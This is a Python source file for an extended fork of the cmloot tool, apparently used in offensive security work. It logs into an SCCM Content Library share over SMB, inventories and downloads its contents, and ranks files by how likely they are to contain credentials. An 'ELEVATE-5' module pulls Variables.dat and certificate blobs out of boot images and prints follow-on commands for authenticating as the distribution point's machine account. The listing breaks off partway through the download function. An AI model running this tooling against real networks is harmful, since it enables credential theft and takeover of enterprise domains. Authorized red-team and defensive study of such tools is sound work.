#!/usr/bin/env python
#
# cmloot - SCCM Content Library enumeration and extraction tool
# Forked from cmloot by Andreas Vikerup (Shelltrail)
# Extended with: progress indication, BFS inventory, interactive download,
#   auto pipeline, file classification, credential analysis, ELEVATE-5 support
#
# Original: https://www.shelltrail.com/research/cmloot/
# License: MIT (see LICENSE)
#

from __future__ import division
from __future__ import print_function
import sys
import logging
import argparse
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.smbconnection import SMBConnection
import os
import re
import time
from collections import deque
from io import BytesIO
from ldap3 import Server, Connection, ALL, NTLM

import struct
import tempfile
import subprocess
import shutil

SEPARATOR = "=" * 64

ELEVATE5_BANNER = """
ELEVATE-5: Distribution Point Takeover via OSD Media Recovery
=============================================================
SCCM OSD boot/PXE images contain Variables.dat with embedded PKI
certificates (Client Auth EKU) that identify the Distribution Point.
Recovering this cert lets you authenticate AS the DP machine account.

Attack chain:
  Step 1: Download boot images      <- cmloot -extensions WIM ISO
  Step 2: Extract Variables.dat      <- this command (-elevate5)
  Step 3: Decrypt with PXEThief     <- pxethief.py 3 Variables.dat
  Step 4: Authenticate as DP$       <- certipy auth -pfx cert.pfx

The SMALL files (boot.wim, prestaged.wim) are most likely to contain
Variables.dat. The LARGE files (install.wim) are full OS images and
do NOT contain task sequence variables -- skip them.
"""

def extract_variables_dat_from_wim(wim_path, output_dir):
    """
    Attempt to extract Variables.dat from a WIM file using 7z or wimlib-imagex.
    Returns path to extracted Variables.dat if found, None otherwise.
    """
    candidates = ["7z", "7z.exe", "7za"]
    seven_zip = None
    for c in candidates:
        if shutil.which(c):
            seven_zip = c
            break

    wimapply = shutil.which("wimlib-imagex") or shutil.which("wimapply")

    extract_dir = os.path.join(output_dir, "_wim_extract")
    os.makedirs(extract_dir, exist_ok=True)

    var_dat_path = None

    if seven_zip:
        cmd = [seven_zip, "x", "-y", f"-o{extract_dir}", wim_path, "SMS/data/Variables.dat"]
        logging.info(f"  Extracting Variables.dat with 7z from {os.path.basename(wim_path)}...")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            candidate = os.path.join(extract_dir, "SMS", "data", "Variables.dat")
            if os.path.isfile(candidate):
                var_dat_path = candidate
                logging.info(f"  Found Variables.dat: {candidate}")
            else:
                for root, dirs, files in os.walk(extract_dir):
                    for f in files:
                        if f.lower() == "variables.dat":
                            var_dat_path = os.path.join(root, f)
                            logging.info(f"  Found Variables.dat: {var_dat_path}")
                            break
                    if var_dat_path:
                        break
                if not var_dat_path:
                    cmd2 = [seven_zip, "l", wim_path]
                    result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=30)
                    if "Variables.dat" in result2.stdout:
                        cmd3 = [seven_zip, "x", "-y", f"-o{extract_dir}", wim_path]
                        subprocess.run(cmd3, capture_output=True, text=True, timeout=120)
                        for root, dirs, files in os.walk(extract_dir):
                            for f in files:
                                if f.lower() == "variables.dat":
                                    var_dat_path = os.path.join(root, f)
                                    break
                            if var_dat_path:
                                break
        except Exception as e:
            logging.warning(f"  7z extraction failed: {e}")

    elif wimapply:
        logging.info(f"  Extracting Variables.dat with wimlib-imagex from {os.path.basename(wim_path)}...")
        try:
            subprocess.run([wimapply, wim_path, "1", extract_dir], capture_output=True, text=True, timeout=120)
            candidate = os.path.join(extract_dir, "SMS", "data", "Variables.dat")
            if os.path.isfile(candidate):
                var_dat_path = candidate
                logging.info(f"  Found Variables.dat: {candidate}")
        except Exception as e:
            logging.warning(f"  wimlib extraction failed: {e}")

    if not var_dat_path and not seven_zip and not wimapply:
        logging.warning("  Neither 7z nor wimlib-imagex found. Install one to extract Variables.dat from WIM files.")
        logging.warning("  On Debian/Ubuntu: apt install p7zip-full wimtools")
        logging.warning("  On Kali: apt install p7zip-full wimtools")

    return var_dat_path


def extract_pfx_credentials(variables_dat_path, output_dir, source_name="unknown"):
    """
    Parse Variables.dat for embedded PFX certificate data and the GUID-based decryption key.
    Also returns the _SMSTSMediaPFX content if found.
    Returns list of dicts with pfx_path, password, and media variables.
    """
    results = []
    try:
        with open(variables_dat_path, 'rb') as f:
            data = f.read()
    except Exception as e:
        logging.error(f"  Cannot read {variables_dat_path}: {e}")
        return results

    text = data.decode('utf-16-le', errors='replace')

    guid_pattern = re.compile(r'\{([A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12})\}')
    guids = list(set(guid_pattern.findall(text)))
    if guids:
        logging.info(f"  Found {len(guids)} GUID(s) in Variables.dat (potential decryption keys):")
        for g in guids:
            logging.info(f"    {g}")

    pfx_pattern = re.compile(b'\x30\x82[\x00-\xff]{2}\x02\x82[\x00-\xff]{2}')
    pfx_starts = []
    pos = 0
    while True:
        pos = data.find(b'_SMSTSMediaPFX', pos)
        if pos == -1:
            break
        pfx_starts.append(pos)
        pos += 1

    if pfx_starts:
        logging.info(f"  Found _SMSTSMediaPFX marker(s) at offset(s): {', '.join(str(p) for p in pfx_starts)}")
        logging.info(f"  This indicates a PKI client authentication certificate is embedded.")
        logging.info(f"  Next steps:")
        logging.info(f"    1. Run PXEThief:  python3 pxethief.py 3 Variables.dat")
        logging.info(f"    2. If no password: try the GUIDs above as the media password")
        logging.info(f"    3. Authenticate with:  certipy auth -pfx <output>.pfx -password <guid>")
        if guids:
            logging.info(f"  Decryption key candidates (try in order):")
            for g in guids:
                logging.info(f"    {{{g}}}")

    task_seq_vars = re.findall(r'_(SMSTSM\w+|OSD\w+|ComputerName|UserDomain|UserID|NetworkAccessAccount|JoinDomain|MachineObjectOU|DomainAdmin|AdminPassword|LocalAdmin)', text, re.IGNORECASE)
    if task_seq_vars:
        unique_vars = sorted(set(task_seq_vars))
        logging.info(f"  Task sequence variables found ({len(unique_vars)}):")
        for v in unique_vars:
            idx = text.find(v)
            context = text[max(0, idx):min(len(text), idx + 120)].replace('\x00', '').replace('\n', ' ').strip()
            context = re.sub(r'\s{2,}', ' ', context)
            logging.info(f"    {v}: {context[:100]}")

    pfx_binary_starts = []
    search_pos = 0
    while True:
        m = pfx_pattern.search(data, search_pos)
        if not m:
            break
        pfx_binary_starts.append(m.start())
        search_pos = m.start() + 1

    for idx, start in enumerate(pfx_binary_starts):
        pfx_data = data[start:]
        end_markers = [pfx_data.find(b'_SMSTS'), pfx_data.find(b'\x00\x00\x00\x00\x00\x00')]
        end_pos = len(pfx_data)
        for marker in end_markers:
            if marker > 0 and marker < end_pos:
                end_pos = marker
        pfx_data = pfx_data[:min(end_pos, 200000)]

        if len(pfx_data) < 100:
            continue

        pfx_file = os.path.join(output_dir, f"cert_{idx+1}.pfx")
        with open(pfx_file, 'wb') as pf:
            pf.write(pfx_data)
        results.append({
            "pfx_path": pfx_file,
            "size": len(pfx_data),
            "guids": guids,
            "source": source_name,
            "var_dat": variables_dat_path,
        })
        logging.info(f"  Extracted raw PFX blob -> {pfx_file} ({len(pfx_data)} bytes)")
        logging.info(f"  NOTE: This is the raw blob, likely encrypted. Use PXEThief to decrypt properly.")

    return results


def elevate5_analyze(lootpath):
    """
    ELEVATE-5: Analyze downloaded WIM/ISO files for OSD media credentials.
    Extracts Variables.dat from WIM files and identifies PKI cert opportunities.
    """
    if not os.path.isdir(lootpath):
        logging.error(f"Output directory {lootpath} not found. Run a download first.")
        return

    log_banner("ELEVATE-5: OSD Media Analysis")
    logging.info(ELEVATE5_BANNER.strip())
    logging.info("")

    wim_iso_files = []
    for f in sorted(os.listdir(lootpath)):
        if not os.path.isfile(os.path.join(lootpath, f)):
            continue
        fl = f.lower()
        if fl.endswith(('.wim', '.iso')):
            wim_iso_files.append(f)

    if not wim_iso_files:
        logging.info("No WIM/ISO files found in loot directory.")
        logging.info("Download OSD media first:")
        logging.info("  python3 cmloot.py domain/user@sccm01 -cmlootdownload sccmfiles.txt -extensions WIM ISO")
        return

    boot_files = []
    install_files = []
    other_wim = []
    for f in wim_iso_files:
        fpath = os.path.join(lootpath, f)
        fsize = os.path.getsize(fpath)
        fl = f.lower()
        entry = (f, fsize)
        if 'boot' in fl or 'prestaged' in fl or 'winpe' in fl or 'sinit' in fl or 'pw' in fl.split('.')[-2].split('-')[-1].lower() if '-' in f else False:
            boot_files.append(entry)
        elif 'install' in fl:
            install_files.append(entry)
        else:
            other_wim.append(entry)
        # Catch small WIMs that aren't installs (likely interesting)
        if fsize < 500 * 1024 * 1024 and entry not in boot_files:
            boot_files.append(entry)

    boot_files = list(dict.fromkeys(boot_files))

    logging.info("WIM/ISO files in loot directory:")
    logging.info("")
    if boot_files:
        logging.info("  BOOT/PXE images (HIGH PRIORITY - likely contain Variables.dat):")
        for f, fsize in boot_files:
            logging.info(f"    {f}  ({format_filesize(fsize)})")
        logging.info("")
    if other_wim:
        logging.info("  Other WIM files (MEDIUM PRIORITY - might contain Variables.dat):")
        for f, fsize in other_wim:
            logging.info(f"    {f}  ({format_filesize(fsize)})")
        logging.info("")
    if install_files:
        logging.info("  Install images (SKIP - full OS images, no SCCM credentials):")
        for f, fsize in install_files:
            logging.info(f"    {f}  ({format_filesize(fsize)})  <-- NOT interesting for ELEVATE-5")
        logging.info("")

    pfx_results = []
    var_dat_files = []
    files_checked = 0

    files_to_check = boot_files + other_wim
    if not files_to_check:
        files_to_check = [(f, os.path.getsize(os.path.join(lootpath, f))) for f in wim_iso_files]

    for f, fsize in files_to_check:
        fpath = os.path.join(lootpath, f)
        if not f.lower().endswith('.wim'):
            logging.info(f"--- {f} ({format_filesize(fsize)}) is an ISO ---")
            logging.info("  ISO files need manual mounting. Try:")
            logging.info("    mkdir /mnt/iso && mount -o loop <file> /mnt/iso")
            logging.info("    Then look for SMS/data/Variables.dat inside")
            continue

        files_checked += 1
        logging.info(f"--- {f} ({format_filesize(fsize)}) ---")
        var_dat = extract_variables_dat_from_wim(fpath, lootpath)
        if var_dat:
            var_dat_files.append(var_dat)
            logging.info(f"  Analyzing Variables.dat...")
            pfx_results.extend(extract_pfx_credentials(var_dat, lootpath, f))

    sms_dir = os.path.join(lootpath, "SMS", "data")
    if os.path.isdir(sms_dir):
        for root, dirs, files in os.walk(sms_dir):
            for f in files:
                if f.lower() == "variables.dat":
                    var_path = os.path.join(root, f)
                    if var_path not in var_dat_files:
                        logging.info(f"")
                        logging.info(f"Found pre-extracted Variables.dat: {var_path}")
                        pfx_results.extend(extract_pfx_credentials(var_path, lootpath, "pre-extracted"))

    logging.info("")
    log_banner("ELEVATE-5 RESULTS")
    if pfx_results:
        logging.info(f"Found {len(pfx_results)} certificate(s)!")
        for i, r in enumerate(pfx_results, 1):
            logging.info(f"")
            logging.info(f"  Certificate #{i}:")
            logging.info(f"    PFX file:       {r['pfx_path']}")
            logging.info(f"    Source WIM:     {r.get('source', 'unknown')}")
            if r['guids']:
                logging.info(f"    Decrypt keys:   {', '.join('{' + g + '}' for g in r['guids'])}")
            logging.info(f"")
            logging.info(f"  Next step (PXEThief):")
            logging.info(f"    python3 pxethief.py 3 {os.path.basename(r.get('var_dat', 'Variables.dat'))}")
            if r['guids']:
                logging.info(f"    If prompted for password, try GUIDs listed above")
            logging.info(f"")
            logging.info(f"  Then authenticate:")
            logging.info(f"    certipy auth -pfx <output>.pfx -password <guid_or_password> -dc-ip <DC_IP>")
    elif var_dat_files:
        logging.info("Variables.dat found but no raw PFX blobs extracted.")
        logging.info("This is normal - the cert is encrypted inside the variables file.")
        logging.info("")
        logging.info("Next step:")
        for vd in var_dat_files:
            logging.info(f"  python3 pxethief.py 3 {vd}")
    elif files_checked > 0:
        logging.info("No Variables.dat found in any WIM file.")
        logging.info("These boot images may not contain OSD task sequence variables.")
        logging.info("Try the other WIM files or check if the share has prestaged media.")
    else:
        logging.info("No WIM files were checked.")

    logging.info("")
    logging.info("Documentation:")
    logging.info("  ELEVATE-5:  https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-5/ELEVATE-5_description.md")
    logging.info("  PXEThief:   https://github.com/MWR-CyberSec/PXEThief")
    logging.info("  Certipy:    https://github.com/ly4k/Certipy")
    logging.info(SEPARATOR)


def format_filesize(size):
    if size < 1024:
        return f"{size}B"
    elif size < 1024 * 1024:
        return f"{size/1024:.1f}KB"
    else:
        return f"{size/(1024*1024):.1f}MB"

def format_elapsed(seconds):
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

def format_eta(elapsed, done, total):
    if done == 0 or total == 0:
        return "?"
    rate = done / elapsed
    remaining = total - done
    eta_secs = remaining / rate if rate > 0 else 0
    return format_elapsed(eta_secs)

def print_progress(prefix, done, total, start_time, extra=""):
    pct = (done / total * 100) if total > 0 else 0
    elapsed = time.time() - start_time
    eta = format_eta(elapsed, done, total)
    bar_width = 20
    filled = int(bar_width * done / total) if total > 0 else 0
    bar = "#" * filled + "-" * (bar_width - filled)
    sys.stdout.write(f"\r{prefix} [{bar}] {done}/{total} {pct:.1f}% | {format_elapsed(elapsed)} elapsed | ETA: {eta} {extra}   ")
    sys.stdout.flush()

def log_banner(msg):
    logging.info(SEPARATOR)
    logging.info(msg)
    logging.info(SEPARATOR)

CATEGORIES = {
    "CREDENTIALS": {
        "desc": "May contain passwords, keys, tokens, or connection strings",
        "patterns": [
            r"(?i)(credential|sylink|epo\.config|ep_defaultpolicy|rfim\.config|ap\.config|" +
            r"apo\.config|dtt\.config|nm|config_apps|config_settings|CustomSettings|" +
            r"aibf_|MPAP_|Setup\.exe\.config|NLog\.config|log4net\.config|" +
            r"SETDAD\.Collector\.exe\.config|OSDResults\.exe\.config|" +
            r"TouchpointAnalyticsClient.*\.exe\.config|GPS.*\.exe\.config|" +
            r"AppInstall\.exe\.config|RedirectService\.exe\.config|" +
            r"GpsScmSvc\.exe\.config|GpsPrintPrintServer\.exe\.config|" +
            r"IntelAudioService\.exe\.config|OneApp\.IGCC.*\.exe\.config|" +
            r"SynapticsFingerprintManager\.exe\.config|" +
            r"dwgviewr\.exe\.config|NotificationsLib\.dll\.config|AecRoomBookConfig)"
        ]
    },
    "MDT/OSD SCRIPTS": {
        "desc": "Microsoft Deployment Toolkit / OS Deployment scripts - may contain domain join creds, local admin passwords, task sequences",
        "patterns": [
            r"(?i)(ZTI|LiteTouch|DeployWiz|WelcomeWiz|BDD_|OSD|MDT|Summary_scripts|" +
            r"Credentials_scripts|OSDBrand|OSDCheck|OSDApps|OSDLocal|OSDBoot|OSDEnd|" +
            r"OSDProgress|OSD_Get|OSD_Install|OSD_Serialize|OSDDisk|SetOEMProductKey|" +
            r"ChooseDiskWPF|Confirm-AzureVM|InstallNetFx3|SetLangTSVar|" +
            r"SetComputerDesc|SetLDAPPath|GetOSLanguages)"
        ]
    },
    "TASK SEQUENCES": {
        "desc": "SCCM task sequence definitions - reveal deployment logic, package IDs, and embedded credentials",
        "patterns": [
            r"(?i)(Task[\._]|CSXML|TSysConf|Custom_Settings\.MSP|Unattend\.xml)"
        ]
    },
    "OSD MEDIA (ELEVATE-5)": {
        "desc": "OS deployment boot images (WIM/ISO) - may contain Variables.dat with PKI client auth certs.",
        "patterns": [
            r"(?i)(\.wim|\.iso|boot\.\d+|prestaged|win\d+\.|pe|winpe)"
        ]
    },
    "APP DEPLOY": {
        "desc": "Application deployment toolkit scripts and configs - may contain install credentials and service account info",
        "patterns": [
            r"(?i)(Deploy-Application|AppDeployToolkit|AppHelper|Dameware|uninstallSEP|" +
            r"detectSEP|efficyuserinstall|clear_ccmcache|RemovePublicLNKFiles|" +
            r"RemoveAppX_whitelisting|detectpublicdesktopicons|Invoke-PSScriptAsUser|" +
            r"importlayout|install\.ps1|install\.vbs|add_computer_in_group|" +
            r"add_description_to_computer|ForceDetectionTip|DisableOffload)"
        ]
    },
    "CONFIG FILES": {
        "desc": "Application and service configuration - may expose internal endpoints, DB connections, API keys",
        "patterns": [
            r"(?i)(configuration\.xml|Config\.xml|Config_AppsOnly|Config_SettingsOnly|" +
            r"Config_AppsAndSettings|branding\.xml|settings\.xml|DefaultConfigs|" +
            r"systemconfiguration\.config|upiconfig\.xml|winihvril_configuration|" +
            r"winihvril_global_configuration|wwanconfig_global_configuration|" +
            r"NetworkCap|AppHelperCap|HotkeyServiceDSU|HotkeyServiceUWP|" +
            r"HPHotkeyNotification|TouchpointAnalytics|SysInfoCap|" +
            r"UEFIDiagsBoot|IntcOEDTopology|Dext_\d+\.ini|model_metadata|" +
            r"dts_apo4_oem|IntelHwKws|IntelKeywordDetector|AecSpaceExConfig|" +
            r"CertificationDB|DataExtraction|LibraryConfig\.config|" +
            r"RogerConfiguration|AecRoomBookStandards|ITM|itm3)"
        ]
    },
    "DRIVERS/HP": {
        "desc": "HP and Intel driver packages, manifests - less interesting for credential harvesting",
        "patterns": [
            r"(?i)(HPManifest|dts_apo4_oem_config|mchpemi|hidemi|SynHidMini|" +
            r"SynUnst|SynSmbDrv|SynRMIHID|FXMisc|PASettings|MIXER|" +
            r"ALTMIXER|RTD3|GNSS|DPInst|dpinst|packlist|ocl_cpu|" +
            r"ABCPY|abcpy|fbconfig|fbconfigsrv|IspSetting|CF22|" +
            r"SZCCID|EPKeys|bigfont|TWAINSP)"
        ]
    },
    "OFFICE/LANG": {
        "desc": "Office MUI/language packs and proofing - not security-relevant",
        "patterns": [
            r"(?i)(mui\.xml|ww\.xml|proofing|proof\.xml|ListOfLanguages|" +
            r"win10_[a-z]{2}(_nores)?|osmmui|groovemui|osmuxmui|publishermui)"
        ]
    },
    "DOTNET/VCREDIST": {
        "desc": "Runtime packages (dotnet, vcredist) - not security-relevant",
        "patterns": [
            r"(?i)(pkg\.dotnet|pkg\.vcredist|pkg\.dxsetup|pkg\.aspnet|pkg\.dwgviewr)"
        ]
    },
    "MISC": {
        "desc": "Uncategorized files",
        "patterns": []
    }
}

HIGH_VALUE_KEYWORDS = [
    r"(?i)(credential|sylink|epo\.config|ap\.config|CustomSettings|" +
    r"DeployWiz_Admin|OSDLocalAdmins|password|ZTIU|ZTIGather|" +
    r"ZTIConfig|bootstrap|CSXML|Unattend|Task\d|Setup\.exe\.config|" +
    r"aibf_|MPAP_|Deploy-Application|SETDAD|NLog|log4net|" +
    r"add_computer_in_group|Dameware|uninstallSEP|efficy|" +
    r"TouchpointAnalytics.*\.exe\.config|RedirectService|" +
    r"AppInstall\.exe\.config|importlayout|" +
    r"\.wim|\.iso|prestaged|Variables\.dat)"
]

def classify_file(filename):
    for cat_name, cat_info in CATEGORIES.items():
        if cat_name == "MISC":
            continue
        for pattern in cat_info["patterns"]:
            if re.search(pattern, filename):
                return cat_name
    return "MISC"

def is_high_value(filename):
    for pattern in HIGH_VALUE_KEYWORDS:
        if re.search(pattern, filename):
            return True
    return False

def classify_loot(lootpath):
    if not os.path.isdir(lootpath):
        logging.error(f"Output directory {lootpath} not found. Run a download first.")
        return

    log_banner(f"CLASSIFY: analyzing downloaded files in {lootpath}")
    logging.info("Files are categorized by type. High-value items (credentials,")
    logging.info("admin scripts, task sequences) are marked with [!].")
    logging.info("")

    files = sorted([f for f in os.listdir(lootpath) if os.path.isfile(os.path.join(lootpath, f))])
    if not files:
        logging.info("No files found in loot directory.")
        return

    categorized = {}
    for f in files:
        cat = classify_file(f)
        if cat not in categorized:
            categorized[cat] = []
        hv = is_high_value(f)
        categorized[cat].append((f, hv))

    cat_order = ["OSD MEDIA (ELEVATE-5)", "CREDENTIALS", "MDT/OSD SCRIPTS", "TASK SEQUENCES", "APP DEPLOY",
                 "CONFIG FILES", "DRIVERS/HP", "OFFICE/LANG", "DOTNET/VCREDIST", "MISC"]

    report_file = os.path.join(lootpath, "_classification_report.txt")
    with open(report_file, 'w') as rf:
        rf.write("CMLoot Classification Report\n")
        rf.write(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        rf.write(f"Directory: {os.path.abspath(lootpath)}\n")
        rf.write(f"Total files: {len(files)}\n\n")

        total_hv = 0
        for cat in cat_order:
            if cat not in categorized:
                continue
            items = categorized[cat]
            desc = CATEGORIES[cat]["desc"]
            hv_count = sum(1 for _, hv in items if hv)
            total_hv += hv_count

            header = f"{cat} ({len(items)} files"
            if hv_count > 0:
                header += f", {hv_count} high-value"
            header += ")"
            print_header = f"--- {header} ---"

            logging.info(print_header)
            logging.info(f"  {desc}")
            rf.write(print_header + "\n")
            rf.write(f"  {desc}\n")

            for fname, hv in sorted(items, key=lambda x: (not x[1], x[0].lower())):
                marker = " [!]" if hv else ""
                line = f"  {fname}{marker}"
                logging.info(line)
                rf.write(line + "\n")

            logging.info("")
            rf.write("\n")

        summary = f"Summary: {len(files)} files, {total_hv} high-value across {len(categorized)} categories"
        logging.info(SEPARATOR)
        logging.info(summary)
        logging.info(f"Full report saved to: {report_file}")
        if total_hv > 0:
            logging.info("")
            logging.info("HIGH-VALUE FILES [!] - review these first:")
            for cat in cat_order:
                if cat not in categorized:
                    continue
                for fname, hv in categorized[cat]:
                    if hv:
                        fpath = os.path.join(lootpath, fname)
                        fsize = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
                        logging.info(f"  [!] {fname} ({format_filesize(fsize)})")

    logging.info(SEPARATOR)

def connect_to_sccm(address, username, password, domain, lmhash, nthash, options, appendToInv):
    if debug_logging:
        logging.debug(f"Attempting to connect to SCCM at {address}")
    try:
        auth_mode = "Kerberos" if options.k else "NTLM"
        logging.info(f"Connecting to {address}:{options.port} ({auth_mode} auth, user: {domain}\\{username})...")
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))
        if options.k is True:
            if debug_logging:
                logging.debug("Using Kerberos authentication")
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip )
        else:
            if debug_logging:
                logging.debug("Using standard SMB authentication")
            smbClient.login(username, password, domain, lmhash, nthash)
        logging.info(f"Authenticated to {address} successfully")
        try:
            def list_folder(targetfolder):
                if debug_logging:
                    logging.debug(f"Listing folder: {targetfolder}")
                files = []
                folders = []
                objects = smbClient.listPath("SCCMContentLib$", targetfolder + "\\*")
                for i in objects:
                    shortname = i._SharedFile__shortname
                    if i._SharedFile__filesize == 0:
                        if shortname not in (".", ".."):
                            folders.append("\\" + address + "\\SCCMContentLib$\\" + targetfolder + "\\" + shortname + "\n")
                    else:
                        files.append("\\" + address + "\\SCCMContentLib$\\" + targetfolder + "\\" + shortname.removesuffix('.INI') + "\n")
                return folders, files

            def create_inventory():
                if debug_logging:
                    logging.debug("Starting inventory creation")
                if os.path.exists(inventory_file) and not appendToInv:
                    logging.info(f"{inventory_file} already exists. Remove it if you want to recreate the inventory")
                    return
                elif os.path.exists(inventory_file) and appendToInv:
                    logging.info(f"{inventory_file} exists. Appending to it")

                smbClient.connectTree("SCCMContentLib$")
                logging.info(f"Connected to SCCMContentLib$ share on {address}")

                log_banner(f"INVENTORY: indexing SCCM Content Library on {address}")
                logging.info("The Content Library stores packages in DataLib/<pkg>/<arch>/<file>.")
                logging.info("Each .INI in DataLib contains the content hash needed to retrieve the")
                logging.info("actual file from FileLib/<hash-prefix>/<full-hash>.")
                start_time = time.time()

                logging.info("")
                logging.info("Phase 1/2: Discovering all subfolders under DataLib\\ (BFS traversal)...")
                folder_queue = deque()
                top_folders, top_files = list_folder("DataLib")
                for f in top_folders:
                    folder_queue.append(f.split("\\SCCMContentLib$\\")[1].strip())

                all_folders = list(folder_queue)
                all_files = list(top_files)
                folders_discovered = len(all_folders)
                discovery_start = time.time()

                while folder_queue:
                    current = folder_queue.popleft()
                    subfolders_raw, subfiles = list_folder(current)
                    for sf in subfolders_raw:
                        sf_path = sf.split("\\SCCMContentLib$\\")[1].strip()
                        folder_queue.append(sf_path)
                        all_folders.append(sf_path)
                        folders_discovered += 1
                    all_files.extend(subfiles)
                    if folders_discovered % 50 == 0 or not folder_queue:
                        elapsed = time.time() - discovery_start
                        sys.stdout.write(f"\r  Folders discovered: {folders_discovered} | Files found so far: {len(all_files)} | {format_elapsed(elapsed)}")
                        sys.stdout.flush()

                sys.stdout.write("\n")
                total_folders = len(all_folders)
                total_files = len(all_files)
                logging.info(f"Discovered {total_folders} folders containing {total_files} files in {format_elapsed(time.time() - discovery_start)}")
                logging.info("")
                logging.info("Phase 2/2: Writing inventory to %s..." % inventory_file)

                buffered_lines = all_files
                buffer_limit = 500
                written = 0

                with open(inventory_file, 'a') as f:
                    for i in range(0, len(buffered_lines), buffer_limit):
                        chunk = buffered_lines[i:i+buffer_limit]
                        f.writelines(chunk)
                        written += len(chunk)
                        print_progress("  Writing", written, total_files, start_time)

                sys.stdout.write("\n")
                elapsed = time.time() - start_time
                logging.info(f"Inventory complete: {total_files} files across {total_folders} folders in {format_elapsed(elapsed)}")

                if appendToInv or options.target_file:
                    sort_and_uniq_file(inventory_file)
                    logging.info(f"{inventory_file} sorted and duplicates removed")
                logging.info(f"Inventory saved to {inventory_file}")

            def downloadfiles():
                if debug_logging:
                    logging.debug("Starting file download process")
                inventory_file = options.cmlootdownload
                lootpath = options.lootpath
                extensions = options.extensions

                log_banner(f"DOWNLOAD: retrieving files from {address}")
                logging.info(f"Extensions to download: {', '.join(extensions)}")
                logging.info("")

                if not os.path.exists(lootpath):
                    logging.info(f"Creating output directory: {lootpath}")
                    os.makedirs(lootpath)

                logging.info("Phase 1/2: Reading inventory and extracting content hashes...")
                logging.info("Each .INI in DataLib contains a Hash= value. The actual file content")
                logging.info("is stored in FileLib\\<first-4-chars>\\<full-hash>. We read the .INI,")
                logging.info("extract the hash, then download the real file from FileLib.")
                downloadlist = {}
                with open(inventory_file, 'r') as fp:
                    lines = [l.strip() for l in fp if l.strip()]
                total_lines = len(lines)
                logging.info(f"Inventory contains {total_lines} entries. Filtering by extension...")

                matching_lines = []
                ext_set = set(e.lower() for e in extensions)
                for line in lines:
                    parts = line.rsplit('.', 1)
                    if len(parts) == 2 and parts[-1].lower() in ext_set:
                        matching_lines.append(line)

                total_matching = len(matching_lines)
                if total_matching == 0:
                    logging.info("No files matched the selected extensions. Nothing to download.")
                    return
                logging.info(f"Found {total_matching} files matching extensions. Resolving content hashes via SMB...")

                hash_start = time.time()
                lines_done = 0
                hash_errors = 0
                for line in matching_lines:
                    share = line.split("\\SCCMContentLib$\\")[1].strip()
                    share = "\\" + share + ".INI"
                    try:
                        f = BytesIO()
                        smbClient.getFile("SCCMContentLib$", share, f.write)
                        content = f.getvalue().decode()
                        hashvalue = re.search("Hash[^=]*=([A-Z0-9]+)", content)
                        if hashvalue:
                            hashvalue = hashvalue.group(1)
                            filename = share.split('\\')[-1].removesuffix('.INI')
                            downloadlist[hashvalue] = filename
                        else:
                            hash_errors += 1
                            if hash_errors <= 3:
                                logging.warning(f"No hash found in {share}")
                            elif hash_errors == 4:
                                logging.warning("Suppressing further 'no hash' warnings...")
                    except Exception as e:
                        hash_errors += 1
                        if hash_errors <= 3:
                            logging.warning(f"Error reading {share}: {e}")
                        elif hash_errors == 4:
                            logging.warning("Suppressing further read errors...")
                    lines_done += 1
                    if lines_done % 10 == 0 or lines_done == total_matching:
                        print_progress("  Resolving hashes", lines_done, total_matching, hash_start, f"| Resolved: {len(downloadlist)}")

                if total_matching > 0:
                    sys.stdout.write("\n")
                elapsed = time.time() - hash_start
                logging.info(f"Hash resolution complete: {len(downloadlist)} resolved, {hash_errors} errors in {format_elapsed(elapsed)}")

                if not downloadlist:
                    logging.info("No downloadable files after hash resolution. Exiting download phase.")
                    return

                logging.info("")
                log_banner(f"DOWNLOAD SELECTION: {len(downloadlist)} files available")

                file_details = []
                hash_sizes = {}
                total_bytes = 0
                logging.info("Querying file sizes from server...")
                size_errors = 0
                for hashvalue, filename in downloadlist.items():
                    parent_path = "\\" + "FileLib" + "\\" + hashvalue[0:4]
                    fsize = 0
                    try:
                        listing = smbClient.listPath("SCCMContentLib$", parent_path + "\\*")
                        for item in listing:
                            if item._SharedFile__shortname == hashvalue:
                                fsize = item._SharedFile__filesize
                                break
                    except Exception:
                        size_errors += 1
                        if size_errors <= 2:
                            logging.debug(f"Could not query size for {hashvalue}")
                    hash_sizes[hashvalue] = fsize
                    total_bytes += fsize
                    cat = classify_file(filename)
                    hv = is_high_value(filename)
                    file_details.append((hashvalue, filename, fsize, cat, hv))

                if size_errors > 2:
                    logging.info(f"  ({size_errors} files had unknown sizes)")

                file_details.sort(key=lambda x: (
                    0 if x[4] else 1,
                    ["OSD MEDIA (ELEVATE-5)", "CREDENTIALS", "MDT/OSD SCRIPTS", "TASK SEQUENCES", "APP DEPLOY"].index(x[3]) if x[3] in ["OSD MEDIA (ELEVATE-5)", "CREDENTIALS", "MDT/OSD SCRIPTS", "TASK SEQUENCES", "APP DEPLOY"] else 99,
                    -x[2],
                ))

                print()
                print(f"  {'#':<4} {'Size':<10} {'Category':<25} {'File':<50}")
                print(f"  {'---':<4} {'---':<10} {'---':<25} {'---':<50}")
                for idx, (hv_hash, fname, fsize, cat, hv_mark) in enumerate(file_details, 1):
                    size_str = format_filesize(fsize) if fsize > 0 else "???"
                    marker = " [!]" if hv_mark else ""
                    cat_display = cat if len(cat) < 25 else cat[:22] + "..."
                    print(f"  {idx:<4} {size_str:<10} {cat_display:<25} {fname}{marker}")
                print()
                print(f"  Total: {format_filesize(total_bytes)} across {len(file_details)} files")
                print()

                if options.yes_download:
                    selected_set = set(range(1, len(file_details) + 1))
                else:
                    print("  Select files to download:")
                    print("    Numbers: 1,3,5    Ranges: 2-4    A = all    Q = quit")
                    try:
                        choice = input("  Choice [A]: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        logging.info("Download cancelled.")
                        return

                    if not choice or choice.lower() == 'a':
                        selected_set = set(range(1, len(file_details) + 1))
                    elif choice.lower() == 'q':
                        logging.info("Download cancelled.")
